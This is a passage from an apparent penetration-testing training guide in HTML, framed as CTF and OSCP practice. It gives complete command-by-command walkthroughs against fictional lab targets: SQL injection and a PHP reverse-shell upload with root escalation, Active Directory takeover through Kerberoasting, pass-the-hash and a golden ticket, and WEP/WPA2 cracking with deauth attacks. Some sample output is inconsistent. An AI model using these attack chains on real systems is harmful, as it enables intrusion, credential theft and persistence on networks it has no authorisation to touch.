                <strong>OSINT resources:</strong><br>
                • <strong>OSINT Framework:</strong> https://osintframework.com/ (tool catalog)<br>
                • <strong>IntelTechniques:</strong> Michael Bazzell's books and resources<br>
                • <strong>Bellingcat:</strong> Open-source investigation techniques<br>
                • <strong>HaveIBeenPwned:</strong> Breach database (haveibeenpwned.com)<br>
                • <strong>Dehashed:</strong> Search engine for breached databases<br><br>
                OSINT is 50%+ of a pentest. Know your target before attacking! 🔍📊</p>
            </div>
        </section>

        <!-- SECTION 11.5: Complete Practical Attack Labs & Real-World Scenarios -->
        <section id="practical-labs" class="section">
            <h2 class="section-title">Complete Practical Attack Labs & Real-World Scenarios</h2>
            <p class="section-intro">You've learned the tools and techniques across all 11 sections. NOW it's time to put EVERYTHING together! This massive section contains complete end-to-end attack walkthroughs showing exactly how tools combine in real pentests. Each lab is a full scenario from reconnaissance → initial access → privilege escalation → lateral movement → objective completion. Perfect for CTF preparation, certification exams (OSCP, PNPT, eCPPT), and understanding real-world attack chains. Every command explained, every technique demonstrated, every mistake avoided. Let's hack! 🎯</p>

            <div class="metaphor-box">
                <h4>💡 From Theory to Practice</h4>
                <p><strong>Why complete walkthroughs matter:</strong><br><br>
                Learning individual tools is like knowing how to use a hammer, saw, and screwdriver. But building a house requires knowing WHEN and HOW to use each tool together! These labs teach you:<br><br>
                • <strong>Tool chaining:</strong> nmap → gobuster → SQL injection → shell → privilege escalation<br>
                • <strong>Pivot thinking:</strong> What to do when initial attack fails? Try another vector!<br>
                • <strong>Real-world timing:</strong> Some exploits take hours to run - plan accordingly<br>
                • <strong>Evidence preservation:</strong> Screenshot everything for your pentest report<br>
                • <strong>Attack paths:</strong> Multiple ways to reach the goal - find the easiest!<br><br>
                <strong>Each lab includes:</strong><br>
                • <strong>Scenario:</strong> Target description and objectives<br>
                • <strong>Reconnaissance:</strong> Information gathering phase<br>
                • <strong>Enumeration:</strong> Service-specific deep dives<br>
                • <strong>Initial Access:</strong> Getting that first shell<br>
                • <strong>Privilege Escalation:</strong> Becoming root/SYSTEM<br>
                • <strong>Lateral Movement:</strong> Compromising additional hosts<br>
                • <strong>Persistence:</strong> Maintaining access<br>
                • <strong>Lessons Learned:</strong> Key takeaways and common mistakes<br><br>
                Think of these as your "master class" - watching an expert hacker work through complete engagements! 🎓</p>
            </div>

            <h3>Lab 1: Complete Web Application Penetration Test (Beginner-Friendly)</h3>

            <div class=\"info-box\">
                <h4>📋 Lab Overview</h4>
                <p><strong>Target:</strong> vulnerable-webapp.htb (fictional)<br>
                <strong>Goal:</strong> Find and exploit vulnerabilities, escalate to admin, read /root/flag.txt<br>
                <strong>Difficulty:</strong> Easy (beginner-friendly)<br>
                <strong>Skills tested:</strong> Recon, subdomain enum, SQL injection, file upload, privilege escalation<br>
                <strong>Time estimate:</strong> 2-4 hours for complete beginner<br>
                <strong>Tools used:</strong> nmap, gobuster, Burp Suite, SQLmap, LinPEAS, GTFOBins</p>
            </div>

            <div class="code"># ==================================================
# PHASE 1: RECONNAISSANCE
# ==================================================

# Step 1: Add to /etc/hosts
echo "10.10.10.100  vulnerable-webapp.htb" | sudo tee -a /etc/hosts

# Step 2: Initial nmap scan
nmap -sC -sV -oA nmap/initial vulnerable-webapp.htb

# Output:
# PORT   STATE SERVICE VERSION
# 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
# 80/tcp open  http    Apache/2.4.41 (Ubuntu)
# |_http-title: VulnWeb Inc.

# Analysis:
# ✅ SSH (port 22) → Potential brute force, but usually low priority
# ✅ HTTP (port 80) → Main attack surface, start here!

# Step 3: Full port scan (while we investigate web)
nmap -p- --min-rate 10000 -oA nmap/allports vulnerable-webapp.htb &

# Step 4: Subdomain enumeration
gobuster vhost -u http://vulnerable-webapp.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Output:
# Found: admin.vulnerable-webapp.htb
# Found: dev.vulnerable-webapp.htb

# Add to /etc/hosts:
echo "10.10.10.100  admin.vulnerable-webapp.htb dev.vulnerable-webapp.htb" | sudo tee -a /etc/hosts

# ==================================================
# PHASE 2: WEB ENUMERATION
# ==================================================

# Step 5: Browse to main site
firefox http://vulnerable-webapp.htb

# Observations:
# - Company website
# - "Products" page
# - "Contact Us" form
# - "Login" link (leads to admin.vulnerable-webapp.htb)
# - Footer: "Powered by CustomCMS 2.3"

# Step 6: Technology fingerprinting
whatweb http://vulnerable-webapp.htb

# Output:
# Apache 2.4.41
# PHP 7.4
# jQuery 3.5
# Bootstrap 4

# Step 7: Directory brute force
gobuster dir -u http://vulnerable-webapp.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak

# Output:
# /index.php
# /images/
# /css/
# /js/
# /admin/ (301 redirect to admin.vulnerable-webapp.htb)
# /uploads/ (403 Forbidden - interesting!)
# /backup/ (403 Forbidden - VERY interesting!)
# /config.php.bak (200 OK - JACKPOT!)

# Step 8: Download interesting file
wget http://vulnerable-webapp.htb/config.php.bak

# View contents:
cat config.php.bak

# Found:
# <?php
# $db_host = 'localhost';
# $db_name = 'webapp_db';
# $db_user = 'webapp_user';
# $db_pass = 'SuperSecretPassword123!';
# ?>

# 🎯 Potential win: Database credentials!

# ==================================================
# PHASE 3: FINDING SQL INJECTION
# ==================================================

# Step 9: Test products page for SQLi
# URL: http://vulnerable-webapp.htb/product.php?id=1

# Manual test:
curl "http://vulnerable-webapp.htb/product.php?id=1'"

# Output:
# MySQL error: You have an error in your SQL syntax...

# ✅ SQL injection confirmed!

# Step 10: SQLmap enumeration
sqlmap -u "http://vulnerable-webapp.htb/product.php?id=1" --dbs

# Output:
# [*] information_schema
# [*] webapp_db

# Enumerate webapp_db:
sqlmap -u "http://vulnerable-webapp.htb/product.php?id=1" -D webapp_db --tables

# Output:
# [*] products
# [*] users
# [*] orders

# Dump users table:
sqlmap -u "http://vulnerable-webapp.htb/product.php?id=1" -D webapp_db -T users --dump

# Output:
# +----+----------+----------------------------------+
# | id | username | password                         |
# +----+----------+----------------------------------+
# | 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |
# | 2  | jsmith   | 098f6bcd4621d373cade4e832627b4f6 |
# +----+----------+----------------------------------+

# Step 11: Crack hashes
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hashes.txt
echo "098f6bcd4621d373cade4e832627b4f6" >> hashes.txt

john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Output:
# password (admin)
# test (jsmith)

# 🎯 Credentials: admin:password

# ==================================================
# PHASE 4: ADMIN ACCESS & FILE UPLOAD
# ==================================================

# Step 12: Login to admin panel
firefox http://admin.vulnerable-webapp.htb

# Login with admin:password → Success!

# Observations:
# - Dashboard
# - User management
# - Product management → "Upload Product Image" feature
# - File manager

# Step 13: Test file upload
# Create PHP reverse shell:
cp /usr/share/webshells/php/php-reverse-shell.php shell.php

# Edit shell.php:
# Change IP to your Kali IP: 10.10.14.5
# Change port to: 4444

# Try uploading shell.php → Error: "Only images allowed"

# Step 14: Bypass upload filter
# Method 1: Double extension
mv shell.php shell.php.jpg
# Upload → Still blocked

# Method 2: Content-Type manipulation
# Intercept with Burp Suite
# Change Content-Type: from application/x-php to image/jpeg
# Upload → Success!

# File uploaded to: /uploads/shell.php.jpg

# Step 15: Check if PHP executed
curl http://vulnerable-webapp.htb/uploads/shell.php.jpg

# Output: PHP source code displayed (not executed)

# Step 16: Try different extension
# Create shell.php5 (alternative PHP extension)
cp /usr/share/webshells/php/php-reverse-shell.php shell.php5

# Edit IP/port, upload → Success!

# ==================================================
# PHASE 5: INITIAL ACCESS (REVERSE SHELL)
# ==================================================

# Step 17: Start netcat listener
nc -lvnp 4444

# Step 18: Trigger shell
curl http://vulnerable-webapp.htb/uploads/shell.php5

# 🎯 Shell received!
# Connection from 10.10.10.100

# Stabilize shell:
python3 -c 'import pty; pty.spawn(\"/bin/bash\")'
# Press Ctrl+Z
stty raw -echo; fg
export TERM=xterm

# Now we have a proper interactive shell!

# ==================================================
# PHASE 6: PRIVILEGE ESCALATION
# ==================================================

# Step 19: Basic enumeration
whoami
# www-data

id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

uname -a
# Linux vulnerable-webapp 5.4.0-42-generic #46-Ubuntu

ls /home
# jsmith
# admin

cat /etc/passwd | grep bash
# root:x:0:0:root:/root:/bin/bash
# jsmith:x:1000:1000::/home/jsmith:/bin/bash
# admin:x:1001:1001::/home/admin:/bin/bash

# Step 20: Check sudo permissions
sudo -l
# Sorry, user www-data may not run sudo

# Step 21: Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Output:
# /usr/bin/passwd
# /usr/bin/gpasswd
# /usr/bin/chsh
# /usr/bin/find (INTERESTING!)
# /usr/bin/sudo
# /bin/mount
# /bin/su

# Step 22: Check GTFOBins for /usr/bin/find
# GTFOBins shows: find can execute commands!

# Exploit:
find . -exec /bin/bash -p \\;

# Result:
whoami
# root

# 🎯 WE ARE ROOT!

# ==================================================
# PHASE 7: POST-EXPLOITATION
# ==================================================

# Step 23: Read flags
cat /root/flag.txt
# HTB{SQL_Inj3ct1on_t0_R00t_Sh3ll_GG!}

cat /home/jsmith/user.txt
# HTB{u53r_fl4g_g0t!}

# Step 24: Persistence (for learning - NOT for real pentests without permission!)

# Add SSH key:
mkdir /root/.ssh
echo "ssh-rsa AAAAB3Nza..." > /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Now you can SSH as root:
ssh root@vulnerable-webapp.htb

# ==================================================
# LESSONS LEARNED
# ==================================================

# ✅ Always check for backup files (.bak, .old, ~)
# ✅ SQL injection → Often leads to credential disclosure
# ✅ File upload filters → Try multiple bypass techniques
# ✅ SUID binaries → Always check against GTFOBins
# ✅ Stabilize shells immediately for better experience
# ✅ Document everything with screenshots for report

# Attack path summary:
# 1. Found config.php.bak with DB credentials
# 2. Discovered SQL injection in product.php
# 3. Dumped database → Got admin hash
# 4. Cracked hash → admin:password
# 5. Logged into admin panel
# 6. Uploaded PHP shell via .php5 extension
# 7. Got reverse shell as www-data
# 8. Found SUID /usr/bin/find binary
# 9. Exploited find → Got root
# 10. Read flags → Lab complete!

# Time taken: ~2 hours for beginner
# Difficulty: Easy (good first box!)</div>

            <h3>Lab 2: Active Directory Penetration Test (Complete Domain Compromise)</h3>

            <div class=\"info-box\">
                <h4>📋 Lab Overview</h4>
                <p><strong>Target:</strong> CORP.LOCAL domain (10.10.10.0/24)<br>
                <strong>Domain Controller:</strong> DC01.CORP.LOCAL (10.10.10.10)<br>
                <strong>Goal:</strong> Gain Domain Admin access, dump all credentials<br>
                <strong>Difficulty:</strong> Intermediate<br>
                <strong>Skills tested:</strong> SMB enum, Kerberoasting, lateral movement, Pass-the-Hash, DCSync<br>
                <strong>Time estimate:</strong> 4-6 hours<br>
                <strong>Tools used:</strong> nmap, enum4linux, Impacket, Responder, Bloodhound, Mimikatz, CrackMapExec</p>
            </div>

            <div class="code"># ==================================================
# PHASE 1: INITIAL RECONNAISSANCE
# ==================================================

# Network: 10.10.10.0/24
# Your Kali: 10.10.10.50
# Domain Controller: 10.10.10.10 (DC01.CORP.LOCAL)
# File Server: 10.10.10.20 (FS01.CORP.LOCAL)
# Workstation: 10.10.10.30 (WS01.CORP.LOCAL)

# Step 1: Add to /etc/hosts
echo "10.10.10.10  DC01.CORP.LOCAL DC01" | sudo tee -a /etc/hosts
echo "10.10.10.20  FS01.CORP.LOCAL FS01" | sudo tee -a /etc/hosts
echo "10.10.10.30  WS01.CORP.LOCAL WS01" | sudo tee -a /etc/hosts

# Step 2: Network scan
nmap -sn 10.10.10.0/24

# Step 3: Detailed scan of discovered hosts
nmap -sC -sV -p- -oA nmap/ad_scan 10.10.10.10,10.10.10.20,10.10.10.30

# DC01 (10.10.10.10) ports:
# 53/tcp  - DNS
# 88/tcp  - Kerberos
# 135/tcp - RPC
# 139/tcp - NetBIOS
# 389/tcp - LDAP
# 445/tcp - SMB
# 464/tcp - Kerberos Password Change
# 3389/tcp - RDP
# → Confirmed Domain Controller!

# FS01 (10.10.10.20) ports:
# 135/tcp - RPC
# 139/tcp - NetBIOS
# 445/tcp - SMB
# → File server

# WS01 (10.10.10.30) ports:
# 135/tcp - RPC
# 139/tcp - NetBIOS
# 445/tcp - SMB
# 3389/tcp - RDP
# → Workstation

# ==================================================
# PHASE 2: SMB ENUMERATION (NO CREDENTIALS)
# ==================================================

# Step 4: Anonymous SMB enumeration
smbclient -L //10.10.10.10 -N

# Output:
# Sharename  Type  Comment
# ---------  ----  -------
# ADMIN$     Disk  Remote Admin
# C$         Disk  Default share
# IPC$       IPC   Remote IPC
# NETLOGON   Disk  Logon server share
# SYSVOL     Disk  Logon server share

# Step 5: Try null session
smbclient //10.10.10.10/SYSVOL -N

# Access denied (expected)

# Step 6: Enum4linux
enum4linux -a 10.10.10.10

# Output:
# Domain: CORP
# Domain SID: S-1-5-21-1234567890-1234567890-1234567890
# 
# Users:
#   Administrator (RID 500)
#   Guest (RID 501)
#   krbtgt (RID 502)
#   jsmith (RID 1103)
#   awhite (RID 1104)
#   bthomas (RID 1105)
#   sqlservice (RID 1106)
# 
# Password Policy:
#   Minimum password length: 7
#   Password complexity: Enabled
#   Lockout threshold: None (brute force possible!)

# 🎯 User list obtained!

# Create users.txt:
cat > users.txt <<EOF
Administrator
jsmith
awhite
bthomas
sqlservice
EOF

# ==================================================
# PHASE 3: KERBEROS ENUMERATION
# ==================================================

# Step 7: Kerbrute user enumeration
kerbrute userenum --dc 10.10.10.10 -d CORP.LOCAL users.txt

# Output:
# [+] VALID USERNAME: Administrator@CORP.LOCAL
# [+] VALID USERNAME: jsmith@CORP.LOCAL
# [+] VALID USERNAME: awhite@CORP.LOCAL
# [+] VALID USERNAME: bthomas@CORP.LOCAL
# [+] VALID USERNAME: sqlservice@CORP.LOCAL

# All users confirmed!

# Step 8: AS-REP Roasting (check for users without Kerberos pre-auth)
impacket-GetNPUsers CORP.LOCAL/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat

# Output:
# [-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
# [-] User jsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
# [+] $krb5asrep$23$awhite@CORP.LOCAL:a1b2c3d4e5f6...

# 🎯 User awhite is AS-REP roastable!

# Step 9: Crack AS-REP hash
echo '$krb5asrep$23$awhite@CORP.LOCAL:a1b2c3d4e5f6...' > awhite_asrep.hash

hashcat -m 18200 awhite_asrep.hash /usr/share/wordlists/rockyou.txt

# Output:
# Password: Welcome123!

# 🎯 First credential: CORP\\awhite:Welcome123!

# ==================================================
# PHASE 4: AUTHENTICATED ENUMERATION
# ==================================================

# Step 10: Validate credentials
crackmapexec smb 10.10.10.10 -u awhite -p 'Welcome123!' -d CORP.LOCAL

# Output:
# SMB  10.10.10.10  445  DC01  [+] CORP.LOCAL\\awhite:Welcome123!

# Step 11: Enumerate SMB shares with creds
smbmap -u awhite -p 'Welcome123!' -d CORP.LOCAL -H 10.10.10.10

# Output:
# [+] Finding open SMB ports....
# [+] User SMB session established on 10.10.10.10...
# [+] IP: 10.10.10.10:445  Name: DC01.CORP.LOCAL
#   Disk         Permissions
#   ----         -----------
#   ADMIN$       NO ACCESS
#   C$           NO ACCESS
#   IPC$         READ ONLY
#   NETLOGON     READ ONLY
#   SYSVOL       READ ONLY
#   Users        READ, WRITE

# Step 12: Explore Users share
smbclient //10.10.10.10/Users -U 'CORP.LOCAL\\awhite%Welcome123!'

# Browse directories:
# awhite/
# jsmith/
# bthomas/
# Public/

# Check awhite folder:
cd awhite
ls
# notes.txt

get notes.txt
cat notes.txt
# "Remember: SQLService password is MYpassword123#"

# 🎯 Second credential: CORP\\sqlservice:MYpassword123#

# ==================================================
# PHASE 5: KERBEROASTING
# ==================================================

# Step 13: Request service tickets (Kerberoasting)
impacket-GetUserSPNs CORP.LOCAL/awhite:'Welcome123!' -dc-ip 10.10.10.10 -request

# Output:
# ServicePrincipalName  Name        MemberOf  PasswordLastSet
# --------------------  ----------  --------  ---------------
# MSSQLSvc/FS01:1433    sqlservice            2023-01-15

# $krb5tgs$23$*sqlservice$CORP.LOCAL$MSSQLSvc/FS01:1433*$abc123...

# Step 14: Crack service ticket
echo '$krb5tgs$23$*sqlservice...' > sqlservice.hash

hashcat -m 13100 sqlservice.hash /usr/share/wordlists/rockyou.txt

# Already have password from notes.txt, but good practice!

# ==================================================
# PHASE 6: BLOODHOUND ANALYSIS
# ==================================================

# Step 15: Collect BloodHound data
bloodhound-python -u awhite -p 'Welcome123!' -ns 10.10.10.10 -d CORP.LOCAL -c All

# Output:
# INFO: Found AD domain: corp.local
# INFO: Getting TGT for user
# INFO: Connecting to LDAP server: DC01.CORP.LOCAL
# INFO: Done in 00M 42S
# INFO: Compressing output into 20240101120000_bloodhound.zip

# Step 16: Start BloodHound
sudo neo4j start
bloodhound

# Upload 20240101120000_bloodhound.zip

# Step 17: Analyze attack paths
# Query: "Shortest Path to Domain Admins from Owned Principals"
# Mark awhite as owned

# Path discovered:
# awhite (Owned)
#   → MemberOf → IT_SUPPORT
#   → GenericAll → jsmith
#   → MemberOf → DOMAIN ADMINS

# Analysis:
# 1. awhite is in IT_SUPPORT group
# 2. IT_SUPPORT has GenericAll permissions on jsmith user
# 3. jsmith is a Domain Admin!
# 4. We can change jsmith's password!

# ==================================================
# PHASE 7: LATERAL MOVEMENT (TARGETED KERBEROASTING)
# ==================================================

# Step 18: Change jsmith password using GenericAll
impacket-changepasswd CORP.LOCAL/jsmith:'NewPassword123!'@10.10.10.10 -newpass 'NewPassword123!' -altuser awhite -altpass 'Welcome123!'

# Actually, better approach: Add SPN to jsmith, then Kerberoast

# Set SPN on jsmith:
impacket-addspn -u CORP.LOCAL\\awhite -p 'Welcome123!' -s 'HTTP/fake' -t jsmith DC01.CORP.LOCAL

# Now Kerberoast jsmith:
impacket-GetUserSPNs CORP.LOCAL/awhite:'Welcome123!' -dc-ip 10.10.10.10 -request-user jsmith

# Output:
# $krb5tgs$23$*jsmith...'

# Crack:
hashcat -m 13100 jsmith.hash rockyou.txt

# Output:
# Password123!

# 🎯 Domain Admin credential: CORP\\jsmith:Password123!

# ==================================================
# PHASE 8: DOMAIN ADMIN ACCESS
# ==================================================

# Step 19: Validate Domain Admin access
crackmapexec smb 10.10.10.10 -u jsmith -p 'Password123!' -d CORP.LOCAL

# Output:
# SMB  10.10.10.10  445  DC01  [+] CORP.LOCAL\\jsmith:Password123! (Pwn3d!)
# (Pwn3d!) = Local admin access!

# Step 20: PSExec as Domain Admin
impacket-psexec CORP.LOCAL/jsmith:'Password123!'@10.10.10.10

# Output:
# [*] Requesting shares on 10.10.10.10.....
# [*] Found writable share ADMIN$
# [*] Uploading file...
# [*] Opening SVCManager on 10.10.10.10.....
# [*] Starting service...

# C:\\Windows\\system32> whoami
# corp\\jsmith

# C:\\Windows\\system32> net user jsmith /domain
# Global Group memberships     *Domain Users   *Domain Admins
# → Domain Admin confirmed!

# ==================================================
# PHASE 9: CREDENTIAL DUMPING
# ==================================================

# Step 21: Dump SAM hashes
impacket-secretsdump CORP.LOCAL/jsmith:'Password123!'@10.10.10.10

# Output:
# [*] Service RemoteRegistry is in stopped state
# [*] Starting service RemoteRegistry
# [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6:::
# Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:x1y2z3a4b5c6d7e8f9g0h1i2j3k4l5m6:::
# CORP.LOCAL\\awhite:1103:aad3b435b51404eeaad3b435b51404ee:n1o2p3q4r5s6t7u8v9w0x1y2z3a4b5c6:::
# CORP.LOCAL\\jsmith:1104:aad3b435b51404eeaad3b435b51404ee:m1n2o3p4q5r6s7t8u9v0w1x2y3z4a5b6:::

# 🎯 All domain hashes dumped!

# Step 22: DCSync attack (alternative method)
impacket-secretsdump -just-dc CORP.LOCAL/jsmith:'Password123!'@10.10.10.10

# Step 23: Pass-the-Hash (no password needed!)
crackmapexec smb 10.10.10.0/24 -u Administrator -H 'a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6'

# Output:
# SMB  10.10.10.10  445  DC01  [+] CORP.LOCAL\\Administrator (Pwn3d!)
# SMB  10.10.10.20  445  FS01  [+] CORP.LOCAL\\Administrator (Pwn3d!)
# SMB  10.10.10.30  445  WS01  [+] CORP.LOCAL\\Administrator (Pwn3d!)

# 🎯 FULL DOMAIN COMPROMISE!

# ==================================================
# PHASE 10: PERSISTENCE (GOLDEN TICKET)
# ==================================================

# Step 24: Create Golden Ticket
# Need:
# - Domain SID: S-1-5-21-1234567890-1234567890-1234567890
# - krbtgt hash: x1y2z3a4b5c6d7e8f9g0h1i2j3k4l5m6

impacket-ticketer -nthash x1y2z3a4b5c6d7e8f9g0h1i2j3k4l5m6 -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain CORP.LOCAL Administrator

# Output:
# [*] Creating basic skeleton ticket and PAC Infos
# [*] Customizing ticket for CORP.LOCAL/Administrator
# [*] Saving ticket in Administrator.ccache

# Use Golden Ticket:
export KRB5CCNAME=Administrator.ccache
impacket-psexec CORP.LOCAL/Administrator@DC01.CORP.LOCAL -k -no-pass

# 🎯 Access to DC with forged ticket (valid for 10 years!)

# ==================================================
# LESSONS LEARNED
# ==================================================

# ✅ Start with anonymous enumeration (enum4linux, Kerbrute)
# ✅ AS-REP Roasting → Often finds service accounts with weak passwords
# ✅ Always read SMB shares for interesting files
# ✅ BloodHound → Shows attack paths you wouldn't find manually
# ✅ Kerberoasting → Service accounts often have passwords in wordlists
# ✅ GenericAll/WriteDACL permissions → Powerful for lateral movement
# ✅ Pass-the-Hash → Don't need plaintext passwords!
# ✅ Golden Ticket → Ultimate persistence (but also ultimate red flag!)

# Attack path summary:
# 1. Enum4linux → Found usernames
# 2. AS-REP Roasting → Got awhite password
# 3. SMB enumeration → Found sqlservice password in notes.txt
# 4. BloodHound → Discovered awhite → jsmith attack path
# 5. Targeted Kerberoasting → Cracked jsmith (Domain Admin)
# 6. PSExec → Got shell on DC
# 7. SecretsDump → Dumped all domain credentials
# 8. Pass-the-Hash → Compromised all hosts
# 9. Golden Ticket → Established persistence

# Time taken: ~5 hours
# Difficulty: Intermediate (realistic AD environment!)</div>

            <h3>Lab 3: Complete Wireless Attack Chain (WEP → WPA2 → WPA3)</h3>

            <div class=\"info-box\">
                <h4>📋 Lab Overview</h4>
                <p><strong>Targets:</strong> Three WiFi networks with different security<br>
                <strong>Goal:</strong> Crack all three networks, understand weaknesses<br>
                <strong>Difficulty:</strong> Beginner to Intermediate<br>
                <strong>Skills tested:</strong> WiFi fundamentals, packet capture, WEP/WPA/WPA3 attacks<br>
                <strong>Time estimate:</strong> 3-5 hours (WEP fast, WPA2 depends on password)<br>
                <strong>Tools used:</strong> aircrack-ng suite, Wireshark, hcxdumptool, hashcat<br>
                <strong>Requirements:</strong> WiFi adapter with monitor mode + injection support</p>
            </div>

            <div class="code"># ==================================================
# SETUP: WiFi ADAPTER CONFIGURATION
# ==================================================

# Step 1: Verify WiFi adapter
iwconfig

# Output:
# wlan0  IEEE 802.11  ESSID:off/any
#        Mode:Managed  Access Point: Not-Associated

# Check chipset:
lsusb | grep -i wireless
# Or:
airmon-ng

# Output:
# PHY   Interface  Driver    Chipset
# phy0  wlan0      ath9k_htc Atheros Communications, Inc. AR9271

# ✅ Atheros AR9271 → Excellent for hacking!

# ==================================================
# NETWORK 1: WEP ATTACK (ANCIENT, BROKEN)
# ==================================================

# Target: "CoffeeShop_FREE" (WEP encryption)
# Reality: Still found in old routers, IoT devices

# Step 2: Enable monitor mode
sudo airmon-ng start wlan0

# Output:
# PHY   Interface  Driver    Chipset
# phy0  wlan0mon   ath9k_htc Atheros Communications, Inc. AR9271
# (monitor mode enabled on wlan0mon)

# Step 3: Scan for networks
sudo airodump-ng wlan0mon

# Output:
# BSSID              PWR  Beacons  #Data  #/s  CH  MB   ENC  CIPHER AUTH ESSID
# A1:B2:C3:D4:E5:F6  -35       24     15    2   6  54e. WEP  WEP         CoffeeShop_FREE
# A2:B3:C4:D5:E6:F7  -48       18      0    0  11  54e  WPA2 CCMP   PSK  MyHomeWiFi
# A3:B4:C5:D6:E7:F8  -52       12      2    0   1  54e  WPA3 CCMP   SAE  SecureNetwork

# Target identified:
# BSSID: A1:B2:C3:D4:E5:F6
# Channel: 6
# ESSID: CoffeeShop_FREE
# Encryption: WEP

# Step 4: Capture packets from target
sudo airodump-ng -c 6 --bssid A1:B2:C3:D4:E5:F6 -w wep_capture wlan0mon

# Output:
# CH  6 ][ Elapsed: 2 mins ]
# BSSID              PWR  Beacons  #Data  #/s  CH  MB   ENC
# A1:B2:C3:D4:E5:F6  -35      240    315    3   6  54e. WEP
# 
# BSSID              STATION            PWR   Rate  Lost  Packets
# A1:B2:C3:D4:E5:F6  B1:C2:D3:E4:F5:A6  -42   54e-54e   0      128

# Keep this running! Need 40,000-85,000 IVs (initialization vectors)
# For WEP: More packets = faster crack

# Step 5: Speed up process with packet injection (new terminal)
sudo aireplay-ng -3 -b A1:B2:C3:D4:E5:F6 -h B1:C2:D3:E4:F5:A6 wlan0mon

# -3: ARP request replay attack
# -b: Target BSSID
# -h: Client MAC (from airodump)

# Output:
# Saving ARP requests in replay_arp-0101-120000.cap
# You should also start airodump-ng to capture replies.
# Read 2435 packets...
#         Size: 312, FromDS: 1, ToDS: 0
#         BSSID = A1:B2:C3:D4:E5:F6
#         Source MAC = B1:C2:D3:E4:F5:A6
# Sending 615 packets per second...

# Watch airodump-ng window:
# #Data column increasing rapidly!
# 5,000 → 10,000 → 25,000 → 50,000 packets

# Step 6: Crack WEP (after ~40,000 IVs)
sudo aircrack-ng wep_capture-01.cap

# Output:
# Opening wep_capture-01.cap
# Attack will be restarted every 5000 captured ivs.
# 
#                      Aircrack-ng 1.6
# 
#                  [00:02:15] Tested 1834562 keys (got 47328 IVs)
# 
#    KB    depth   byte(vote)
#     0    0/  1   5A(47104) 2F(46080) 8E(45824) ...
#     1    0/  1   3C(47360) A1(46336) 2D(45568) ...
# 
# KEY FOUND! [ 5A:3C:8F:21:D4:9B:E7:A2:1F:C3:4D ]
# Decrypted correctly: 100%

# 🎯 WEP cracked in ~2 minutes!

# Step 7: Connect to WEP network
# Convert hex key to ASCII:
echo "5A3C8F21D49BE7A21FC34D" | xxd -r -p
# Or just use hex directly

sudo nmcli device wifi connect "CoffeeShop_FREE" password "5A:3C:8F:21:D4:9B:E7:A2:1F:C3:4D"

# Connected! Free coffee shop internet 😅

# ==================================================
# NETWORK 2: WPA2-PSK ATTACK (HANDSHAKE CAPTURE)
# ==================================================

# Target: "MyHomeWiFi" (WPA2-PSK/CCMP)
# Modern standard, but vulnerable to dictionary attacks

# Step 8: Capture WPA2 handshake
sudo airodump-ng -c 11 --bssid A2:B3:C4:D5:E6:F7 -w wpa2_capture wlan0mon

# Output shows one client connected:
# STATION: C1:D2:E3:F4:A5:B6

# Need to capture 4-way handshake:
# Occurs when client connects to AP
# Options:
#   a) Wait for natural connection (slow)
#   b) Force deauthentication (fast)

# Step 9: Deauth attack (force handshake)
# New terminal:
sudo aireplay-ng -0 5 -a A2:B3:C4:D5:E6:F7 -c C1:D2:E3:F4:A5:B6 wlan0mon

# -0: Deauth attack
# 5: Send 5 deauth packets
# -a: AP BSSID
# -c: Client MAC

# Output:
# 12:45:23  Waiting for beacon frame (BSSID: A2:B3:C4:D5:E6:F7) on channel 11
# 12:45:24  Sending 64 directed DeAuth...
# 12:45:24  Sending 64 directed DeAuth...

# Watch airodump-ng terminal:
# Top right corner shows:
# [ WPA handshake: A2:B3:C4:D5:E6:F7 ]

# 🎯 Handshake captured!

# Step 10: Verify handshake
sudo aircrack-ng wpa2_capture-01.cap

# Output:
# Opening wpa2_capture-01.cap
# Reading packets, please wait...
# 
# 1 potential targets
# 
# # BSSID              ESSID          Encryption
# 1 A2:B3:C4:D5:E6:F7  MyHomeWiFi     WPA (1 handshake)

# Handshake confirmed!

# Step 11: Crack with aircrack-ng (CPU-based)
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa2_capture-01.cap

# Output:
#                       Aircrack-ng 1.6
# 
#       [00:05:42] 1847232/14344392 keys tested (5421.83 k/s)
# 
#       KEY FOUND! [ MySecurePassword2023! ]
# 
# Master Key: A1 B2 C3 D4 E5 F6 G7 H8 I9 J0 K1 L2 M3 N4 O5 P6
# 
# Transient Key: P1 O2 N3 M4 L5 K6 J7 I8 H9 G0 F1 E2 D3 C2 B1 A0

# OR use hashcat (GPU-accelerated, MUCH faster)

# Step 12: Convert to hashcat format
hcxpcapngtool -o wpa2_hash.hc22000 wpa2_capture-01.cap

# Step 13: Crack with hashcat
hashcat -m 22000 wpa2_hash.hc22000 /usr/share/wordlists/rockyou.txt

# Output:
# Session..........: hashcat
# Status...........: Cracked
# Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)
# Hash.Target......: wpa2_hash.hc22000
# Time.Started.....: Mon Jan 01 12:00:00 2024
# Time.Estimated...: Mon Jan 01 12:03:42 2024 (3 mins 42 secs)
# Kernel.Feature...: Pure Kernel
# Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
# Speed.#1.........:   125.4 kH/s (95.42ms)
# Recovered........: 1/1 (100.00%) Digests
# Progress.........: 23456789/14344392 (163.55%)
# 
# A2B3C4D5E6F7:C1D2E3F4A5B6:A2B3C4D5E6F7:MyHomeWiFi:MySecurePassword2023!

# 🎯 WPA2 cracked!

